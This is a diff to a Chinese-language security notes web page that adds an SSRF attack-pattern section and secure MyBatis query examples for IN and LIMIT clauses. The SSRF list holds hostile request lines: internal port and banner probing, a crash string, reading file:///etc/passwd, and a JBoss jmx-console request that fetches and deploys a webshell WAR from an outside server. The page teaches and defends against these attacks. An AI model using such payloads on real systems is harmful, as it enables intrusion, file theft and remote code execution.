@@ -2883,6 +2883,13 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#ssrf" title="SSRF" class="md-nav__link">
+    SSRF
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sql" title="SQL注入" class="md-nav__link">
     SQL注入
   </a>
@@ -2921,6 +2928,13 @@
         
       </ul>
     </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jpa-hibernate" title="JPA &amp; Hibernate" class="md-nav__link">
+    JPA &amp; Hibernate
+  </a>
   
 </li>
         
@@ -3408,6 +3422,13 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#ssrf" title="SSRF" class="md-nav__link">
+    SSRF
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sql" title="SQL注入" class="md-nav__link">
     SQL注入
   </a>
@@ -3446,6 +3467,13 @@
         
       </ul>
     </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jpa-hibernate" title="JPA &amp; Hibernate" class="md-nav__link">
+    JPA &amp; Hibernate
+  </a>
   
 </li>
         
@@ -3520,6 +3548,31 @@
                 
                 
                 <h1 id="attack_pattern">attack_pattern<a class="headerlink" href="#attack_pattern" title="Permanent link">&para;</a></h1>
+<h2 id="ssrf">SSRF<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>所有场景都可攻击 <strong>内网</strong> 或 <strong>本地</strong></p>
+</blockquote>
+<ol>
+<li>请求非http服务的端口<ul>
+<li>返回banner信息，如：<code>http://scanme.nmap.org:22/test.txt</code>返回OpenSSH版本, <code>http://127.0.0.1:3306/test.txt</code>返回MySQL版本.</li>
+<li>探测端口开放状态, 如请求关闭的端口: <code>http://scanme.nmap.org:25/test.txt</code>报错.</li>
+</ul>
+</li>
+<li>正则表达式攻击造成应用程序溢出<ul>
+<li>如果<code>9876</code>端口开放, 构造<code>http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>使进程崩溃.</li>
+</ul>
+</li>
+<li>通过访问默认文件, 识别应用<ul>
+<li><code>http://10.0.0.1/portName.js</code>可以根据返回结果判断是否是 Dlink 路由器.</li>
+</ul>
+</li>
+<li>访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.<ul>
+<li><code>http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;<mark class="critic">arg0=http://our_public_internet_server/utils/cmd.war</mark></code></li>
+</ul>
+</li>
+<li>请求非http协议, 读取本地文件, 如: <code>file:///etc/passwd</code>。</li>
+<li>间接获取内置帐号token。</li>
+</ol>
 <h2 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
 <h3 id="jdbc">JDBC<a class="headerlink" href="#jdbc" title="Permanent link">&para;</a></h3>
 <div class="superfences-tabs">
@@ -3693,7 +3746,55 @@
 </ul>
 <details class="danger" open="open"><summary>Danger</summary><p>需要对用户输入进行过滤, 防止在大数据量情况下输入<code><mark class="critic">%%</mark></code>导致<mark class="critic">DOS</mark>。</p>
 </details>
+<ul>
+<li>
+<p><strong>in</strong>, 使用<code>&lt;foreach&gt;</code>和<code>#{}</code></p>
+<div class="superfences-tabs">
+<input name="__tabs_4" type="radio" id="__tab_4_0" checked="checked" />
+<label for="__tab_4_0">Java</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">List</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="nf">getUserListIn</span><span class="o">(</span><span class="nd">@Param</span><span class="o">(</span><span class="s">&quot;nameList&quot;</span><span class="o">)</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">nameList</span><span class="o">);</span>
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_4" type="radio" id="__tab_4_1" />
+<label for="__tab_4_1">xml</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&quot;selectUserIn&quot;</span> <span class="na">resultType=</span><span class="s">&quot;com.example.User&quot;</span><span class="nt">&gt;</span>
+    SELECT * FROM user WHERE name in
+    <span class="nt">&lt;foreach</span> <span class="na">item=</span><span class="s">&quot;name&quot;</span> <span class="na">collection=</span><span class="s">&quot;nameList&quot;</span> <span class="na">open=</span><span class="s">&quot;(&quot;</span> <span class="na">separator=</span><span class="s">&quot;,&quot;</span> <span class="na">close=</span><span class="s">&quot;)&quot;</span><span class="nt">&gt;</span>
+        #{name}
+    <span class="nt">&lt;/foreach&gt;</span>
+<span class="nt">&lt;/select&gt;</span>
+</pre></div>
+</td></tr></table></div>
+</div>
+</li>
+<li>
+<p><strong>limit</strong>, 使用<code>#{}</code></p>
+<div class="superfences-tabs">
+<input name="__tabs_5" type="radio" id="__tab_5_0" checked="checked" />
+<label for="__tab_5_0">Java</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">List</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="nf">getUserListLimit</span><span class="o">(</span><span class="nd">@Param</span><span class="o">(</span><span class="s">&quot;offset&quot;</span><span class="o">)</span> <span class="kt">int</span> <span class="n">offset</span><span class="o">,</span> <span class="nd">@Param</span><span class="o">(</span><span class="s">&quot;limit&quot;</span><span class="o">)</span> <span class="kt">int</span> <span class="n">limit</span><span class="o">);</span>
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_5" type="radio" id="__tab_5_1" />
+<label for="__tab_5_1">xml</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">&lt;select</span> <span class="na">id=</span><span class="s">&quot;getUserListLimit&quot;</span> <span class="na">resultType=</span><span class="s">&quot;org.example.User&quot;</span><span class="nt">&gt;</span>
+    SELECT * FROM user limit #{offset}, #{limit}
+<span class="nt">&lt;/select&gt;</span>
+</pre></div>
+</td></tr></table></div>
+</div>
+</li>
+</ul>
 </details>
+<h3 id="jpa-hibernate">JPA &amp; Hibernate<a class="headerlink" href="#jpa-hibernate" title="Permanent link">&para;</a></h3>
+<p>略</p>
 <details class="quote" open="open"><summary>参考链接</summary><p><a href="https://mp.weixin.qq.com/s/hdOnO-tSGkQp0Wq3wcsIkw">彻底干掉恶心的 SQL 注入漏洞， 一网打尽！</a></p>
 </details>
 <h2 id="_1">命令注入<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
